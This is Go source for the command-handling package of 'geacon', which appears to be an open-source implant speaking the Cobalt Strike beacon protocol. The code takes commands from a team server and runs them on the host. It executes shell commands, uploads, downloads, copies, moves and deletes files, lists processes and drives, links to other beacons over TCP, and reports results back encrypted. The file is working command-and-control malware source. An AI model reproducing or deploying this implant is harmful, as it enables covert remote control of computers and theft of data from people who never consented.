package packet

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"geacon/cmd/util"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"net"
	"time"

	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/process"
)

const (
	CMD_TYPE_SPAWN			= 1		// TODO
	CMD_TYPE_EXIT        	= 3		// IMPLEMENTED
	CMD_TYPE_SLEEP        	= 4		// IMPLEMENTED 
	CMD_TYPE_CD           	= 5		// IMPLEMENTED
	CMD_TYPE_DATA_JITTER  	= 6		// TODO
	CMD_TYPE_CHECKIN	  	= 8		// WONTFIX: only required for DNS beacons
	CMD_TYPE_DLL_INJECT		= 9		// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
	CMD_TYPE_UPLOAD_START 	= 10	// IMPLEMENTED
	CMD_TYPE_DOWNLOAD     	= 11	// IMPLEMENTED
	CMD_TYPE_PIPE_FWD		= 22 	// ??? is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
	CMD_TYPE_GETUID		  	= 27	// IMPLEMENTED
	CMD_TYPE_LIST_PROCESS 	= 32	// IMPLEMENTED
	CMD_TYPE_RUNAS			= 38	// TODO
	CMD_TYPE_PWD          	= 39	// IMPLEMENTED
	CMD_TYPE_JOB_KILL		= 42	// TODO: requires job control to be implemented
	CMD_TYPE_DLL_INJECT_64	= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
	CMD_TYPE_SPAWN_64		= 44	// TODO
	CMD_TYPE_IP_CONFIG	  	= 48	// TODO
	CMD_TYPE_LOGIN_USER		= 49	// WONTFIX: ticket forging is not a thing in UNIX afaik
	CMD_TYPE_PORT_FWD		= 50 	// TODO
	CMD_TYPE_PORT_FWD_STOP	= 51	// TODO
	CMD_TYPE_FILE_BROWSE  	= 53	// IMPLEMENTED
	CMD_TYPE_DRIVES		  	= 55	// IMPLEMENTED
	CMD_TYPE_RM			  	= 56	// IMPLEMENTED
	CMD_TYPE_UPLOAD_LOOP  	= 67	// IMPLEMENTED
	CMD_TYPE_LINK_EXPLICIT	= 68	// TBD, SMB communication if possible
	CMD_TYPE_CP			  	= 73	// IMPLEMENTED
	CMD_TYPE_MV			  	= 74	// IMPLEMENTED
	CMD_TYPE_RUN_UNDER		= 76	// TBD, injection into UNIX processes might be out of scope of this project
	CMD_TYPE_GET_PRIVS	  	= 77	// TODO
	CMD_TYPE_SHELL        	= 78	// IMPLEMENTED
	CMD_TYPE_LOAD_DLL		= 80	// WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
	CMD_TYPE_REG_QUERY		= 81	// WONTFIX: No Registry on UNIX
	CMD_TYPE_PIVOT_LISTEN	= 82	// TBD
	CMD_TYPE_CONNECT	  	= 86	// TODO
	CMD_TYPE_INLINE_EXEC	= 95	// WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
	// CMD_TYPE_DISCONNECT	  = ??

	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
	BEACON_RSP_DOWNLOAD_START	        = 2
	BEACON_RSP_OUTPUT_SCREENSHOT	    = 3
	BEACON_RSP_SOCKS_DIE	            = 4
	BEACON_RSP_SOCKS_WRITE	            = 5
	BEACON_RSP_SOCKS_RESUME	        	= 6
	BEACON_RSP_SOCKS_PORTFWD	        = 7
	BEACON_RSP_DOWNLOAD_WRITE	        = 8
	BEACON_RSP_DOWNLOAD_COMPLETE	    = 9
	BEACON_RSP_BEACON_LINK	            = 10
	BEACON_RSP_DEAD_PIPE	            = 11
	BEACON_RSP_BEACON_CHECKIN	        = 12
	BEACON_RSP_BEACON_POST_ERROR	  	= 13
	BEACON_RSP_PIPES_PING		        = 14
	BEACON_RSP_BEACON_IMPERSONATED	    = 15
	BEACON_RSP_BEACON_GETUID	        = 16
	BEACON_RSP_BEACON_OUTPUT_PS	    	= 17
	BEACON_RSP_ERROR_CLOCK_SKEW	    	= 18
	BEACON_RSP_BEACON_GETCWD	        = 19
	BEACON_RSP_BEACON_OUTPUT_JOBS	    = 20
	BEACON_RSP_BEACON_OUTPUT_HASHES		= 21
	BEACON_RSP_FILE_BROWSE_RESULT      	= 22
	BEACON_RSP_SOCKS_ACCEPT	        	= 23
	BEACON_RSP_BEACON_OUTPUT_NET	    = 24
	BEACON_RSP_BEACON_OUTPUT_PORTSCAN	= 25
	BEACON_RSP_BEACON_EXIT	            = 26
	BEACON_RSP_OUTPUT	                = 30
	BEACON_RSP_BEACON_ERROR				= 31
	BEACON_RSP_OUTPUT_UTF8				= 32
)

var (
	errorBuf []byte
)

func ParseCommandShell(b []byte) (string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd
}

func Shell(path string, args []byte) []byte {
	switch runtime.GOOS {
	case "windows":
		args = bytes.Trim(args, " ")
		argsArray := strings.Split(string(args), " ")
		cmd := exec.Command(path, argsArray...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		return out
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux":
		path = "/bin/sh"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Sprintf("exec failed with %s\n", err)
	}
	return out

}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) int {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		//fmt.Printf("file create err : %v\n", err)
		return 0
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		//fmt.Printf("file write err : %v\n", err)
		return 0
	}
	//fmt.Printf("the offset is %d\n",offset)
	return offset
}
func ChangeCurrentDir(path []byte) {
	err := os.Chdir(string(path))
	if err != nil {
		//processError(err.Error())
		processErrorTest(40, 0, 0, err.Error())
	}
}
func GetCurrentDirectory() []byte {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	return []byte(result)
}

func RemoveFile(path []byte) {
	err := os.Remove(string(path))
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
	}
}

func ListDrives() []byte {
	partitions, err := disk.Partitions(true)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}

	var sb strings.Builder

	for _, partition := range partitions {
		sb.WriteString(fmt.Sprintf("%s\n", partition.Mountpoint))
	}

	return []byte(sb.String())
}

func GetUid() []byte {
	userDetails, err := user.Current()
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		return nil
	}
	result := fmt.Sprintf("%s (uid=%s, gid=%s)\n", userDetails.Username, userDetails.Uid, userDetails.Gid)
	return []byte(result)
}

func ParseCommandCopyMove(b []byte) ([]byte, []byte) {
	var fromPath []byte
	var toPath []byte
	buf := bytes.NewBuffer(b)
	fromPathLenBytes := make([]byte, 4)
	_, err := buf.Read(fromPathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	} else {
		fromPathLen := ReadInt(fromPathLenBytes)
		fromPath = make([]byte, fromPathLen)
		_, err = buf.Read(fromPath)
		if err != nil {
			processErrorTest(0, 0, 0, err.Error())
			// panic(err)
		} else {
			toPathLenBytes := make([]byte, 4)
			_, err = buf.Read(toPathLenBytes)
			if err != nil {
				processErrorTest(0, 0, 0, err.Error())
				// panic(err)
			} else {
				toPathLen := ReadInt(toPathLenBytes)
				toPath = make([]byte, toPathLen)
				buf.Read(toPath)
			}
		}
	}

	return fromPath, toPath
}

func CopyFile(fromPath, toPath []byte) {
	in, err := os.Open(string(fromPath))
    if err != nil {
        fmt.Printf("File Open error: %s\n", err)
		processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err) )
    } else {
		out, err := os.Create(string(toPath))
		if err != nil {
			fmt.Printf("File Open error: %s\n", err)
			processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err) )
	
		} else {
			_, err = io.Copy(out, in)
			if err != nil {
				fmt.Printf("File Copy error: %s\n", err)
				processErrorTest(13, 0, 0, fmt.Sprintf("File copy error: %s", err) )
			}
		}
		defer out.Close()
	}
    defer in.Close()
}

func MoveFile(oldLocation, newLocation []byte) {
	err := os.Rename(string(oldLocation), string(newLocation))
	if err != nil {
		fmt.Printf("File Move error: %s\n", err)
		processErrorTest(14, 0, 0, fmt.Sprintf("File move error: %s", err) )
	}
}

func ListProcesses() []byte {
	processList, err := process.Processes()
	if err != nil {
		fmt.Printf("Process list error: %s\n", err)
		return nil
	}

	var sb strings.Builder

	for _, processEntity := range processList {
		parent, err := processEntity.Ppid()
		if err != nil {
			fmt.Printf("Error getting process parent: %s\n", err)
		} 
		name, err := processEntity.Name()
		if err != nil {
			fmt.Printf("Error getting process name: %s\n", err)
		} 
		username, err := processEntity.Username()
		if err != nil {
			fmt.Printf("Error getting process user: %s\n", err)
		} 
		// for whatever reason, Cobalt Strike expects the output in the format
		// PPID <TAB> PID <TAB> Name <TAB> Arch <TAB> Session <TAB> User
		//
		// As arch and session are not really a thing in UNIX, we just leave these fields blank
		sb.WriteString(fmt.Sprintf("%s\t%d\t%d\t\t%s\n", name, parent, processEntity.Pid, username))
	}

	return []byte(sb.String())
}

func ParseCommandConnect(b []byte) ([]byte, uint16) {
	// data is 2 Bytes for port, 4 Bytes for Address. 
	// As there is no data in the buffer apart from that, we just use buf.Len() to get the remainder of available bytes for the address.
	buf := bytes.NewBuffer(b)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())
	portRaw := make([]byte, 2)
	_, err := buf.Read(portRaw)
	port := ReadShort(portRaw)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	fmt.Printf("Port is %d\n", port)

	fmt.Printf("Remaining bytes: %d\n", buf.Len())

	addr := make([]byte, buf.Len())
	_, err = buf.Read(addr)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	fmt.Printf("Address is %s\n", addr)

	// return addr, port
	return addr, port
}

func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {

	var beaconId int
	var encryptedMetaInfo []byte

	dialer := net.Dialer{Timeout: 5*time.Millisecond}
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", addr, port))
	if err != nil {
		processErrorTest(68, 0, 0, "")
		// panic(err)
		return -1, nil
    } else {
		initialMessage := make([]byte, 4)
		bytesRead, err := conn.Read(initialMessage)
		if err != nil {
			// panic(err)
			processErrorTest(68, 0, 0, "")
			return -1, nil
		} else {
			fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, initialMessage)
	
			message := make([]byte, 140)
			bytesRead, err = conn.Read(message)
			if err != nil {
				processErrorTest(68, 0, 0, "")
				// panic(err)
				return -1, nil
			} else {
				trimmedMessage := message[:bytesRead]
				fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, trimmedMessage)
				fmt.Printf("[ATT]: %d bytes left to read!\nData not read: %x\n\n", len(message[bytesRead:]), message[bytesRead:])
			
				// attempt to xor the second message with the first as a key
				// unmaskedMessage := unmask(util.BytesCombine(initialMessage, trimmedMessage))
			
				fmt.Printf("Let's assume we start with a beacon ID, which is apparently a LittleEndian UInt32, and therefore 4 bytes long \n")
				buf := bytes.NewBuffer(trimmedMessage)
				beaconIdLen := make([]byte, 4)
				buf.Read(beaconIdLen)
				beaconId = int(ReadLittleInt(beaconIdLen))
				fmt.Printf("Beacon ID  %d\n", beaconId)
			
				// The rest of the payload are 128 bytes, the exact length allowed for RSA decrypt on the team server. Coincidence? I think not!
				encryptedMetaInfo = trimmedMessage[4:132]
				fmt.Printf("Beacon metainfo  %x\n", encryptedMetaInfo)
			
				AddTcpBeaconLink(beaconId, conn, 0, encryptedMetaInfo)
				return beaconId, encryptedMetaInfo
			}
		}	
	}

	// return beaconId, encryptedMetaInfo

}

func File_Browse(b []byte) []byte {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		processErrorTest(0, 0, 0, err.Error())
		// panic(err)
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		processErrorTest(40, 0, 0, err.Error())
		return nil
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		processErrorTest(40, 0, 0, err.Error())
		// panic(err)
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}
	//fmt.Println(resultStr)

	return util.BytesCombine(pendingRequest, []byte(resultStr))

}

// error ids
//
// 0 = "DEBUG: " + errMsgBytes
// 1 = "Failed to get token"
// 2 = "BypassUAC is for Windows 7 and later"
// 3 = "You're already an admin"
// 4 = "could not connect to pipe"
// 5 = "Maximum links reached. Disconnect one"
// 6 = "I'm already in SMB mode"
// 7 = "could not run command (w/ token) because of its length of " + arg1Bytes + " bytes!"
// 8 = "could not upload file: " + arg1Bytes
// 9 = "could not get file time: " + arg1Bytes
// 10 = "could not set file time: " + arg1Bytes
// 11 = "Could not create service: " + arg1Bytes
// 12 = "Failed to impersonate token: " + arg1Bytes
// 13 = "copy failed: " + arg1Bytes
// 14 = "move failed: " + arg1Bytes
// 15 = "ppid " + arg1Bytes + " is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset."
// 16 = "could not write to process memory: " + arg1Bytes
// 17 = "could not adjust permissions in process: " + arg1Bytes
// 18 = arg1Bytes + " is an x64 process (can't inject x86 content)"
// 19 = arg1Bytes + " is an x86 process (can't inject x64 content)"
// 20 = "Could not connect to pipe: " + arg1Bytes
// 21 = "Could not bind to " + arg1Bytes
// 22 = "Command length (" + arg1Bytes + ") too long"
// 23 = "could not create pipe: " + arg1Bytes
// 24 = "Could not create token: " + arg1Bytes
// 25 = "Failed to impersonate token: " + arg1Bytes
// 26 = "Could not start service: " + arg1Bytes
// 27 = "Could not set PPID to " + arg1Bytes
// 28 = "kerberos ticket purge failed: " + arg1Bytes
// 29 = "kerberos ticket use failed: " + arg1Bytes
// 30 = "Could not open process token: " + arg1Bytes + " (" + arg2Bytes + ")"
// 31 = "could not allocate " + arg1Bytes + " bytes in process: " + arg2Bytes
// 32 = "could not create remote thread in " + arg1Bytes + ": " + arg2Bytes
// 33 = "could not open process " + arg1Bytes + ": " + arg2Bytes
// 34 = "Could not set PPID to " + arg1Bytes + ": " + arg2Bytes
// 35 = "Could not kill " + arg1Bytes + ": " + arg2Bytes
// 36 = "Could not open process token: " + arg1Bytes + " (" + arg2Bytes + ")"
// 37 = "Failed to impersonate token from " + arg1Bytes + " (" + arg2Bytes + ")"
// 38 = "Failed to duplicate primary token for " + arg1Bytes + " (" + arg2Bytes + ")"
// 39 = "Failed to impersonate logged on user " + arg1Bytes + " (" + arg2Bytes + ")"
// 40 = "Could not open '" + errMsgBytes + "'"
// 41 = "could not spawn " + errMsgBytes + " (token): " + arg1Bytes
// 48 = "could not spawn " + errMsgBytes + ": " + arg1Bytes
// 49 = "could not open " + errMsgBytes + ": " + arg1Bytes
// 50 = "Could not connect to pipe (" + errMsgBytes + "): " + arg1Bytes
// 51 = "Could not open service control manager on " + errMsgBytes + ": " + arg1Bytes
// 52 = "could not open " + errMsgBytes + ": " + arg1Bytes
// 53 = "could not run " + errMsgBytes
// 54 = "Could not create service " + errMsgBytes
// 55 = "Could not start service " + errMsgBytes
// 56 = "Could not query service " + errMsgBytes
// 57 = "Could not delete service " + errMsgBytes
// 58 = "Privilege '" + errMsgBytes + "' does not exist"
// 59 = "Could not open process token"
// 60 = "File '" + errMsgBytes + "' is either too large (>4GB) or size check failed"
// 61 = "Could not determine full path of '" + errMsgBytes + "'"
// 62 = "Can only LoadLibrary() in same-arch process"
// 63 = "Could not open registry key: " + arg1Bytes
// 64 = "x86 Beacon cannot adjust arguments in x64 process"
// 65 = "Could not adjust arguments in process: " + arg1Bytes
// 66 = "Real arguments are longer than fake arguments."
// 67 = "x64 Beacon cannot adjust arguments in x86 process"
// 68 = "Could not connect to target"
// 69 = "could not spawn " + errMsgBytes + " (token&creds): " + arg1Bytes
// 70 = "Could not connect to target (stager)"
// 71 = "Could not update process attribute: " + arg1Bytes
// 72 = "could not create remote thread in " + arg1Bytes + ": " + arg2Bytes
// 73 = "allocate section and copy data failed: " + arg1Bytes
// 74 = "could not spawn " + errMsgBytes + " (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token."
// 75 = "current process will not auto-elevate COM object. Try from a program that lives in c:\\windows\\*"


func processErrorTest(errId int, errArg1 int, errArg2 int, err string) {
	fmt.Printf("Error with code %d received\n", errId)

	errIdBytes := WriteInt(errId) // must be zero
	arg1Bytes := WriteInt(errArg1)  // for debug
	arg2Bytes := WriteInt(errArg2)
	errMsgBytes := []byte(err)
	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
	fmt.Printf("Error byte array: [%x]\n", result)
	finalPacket := MakePacket(BEACON_RSP_BEACON_ERROR, result)
	PushResult(EncryptPacket(finalPacket))
	// errorBuf = append(errorBuf, finalPacket...)
}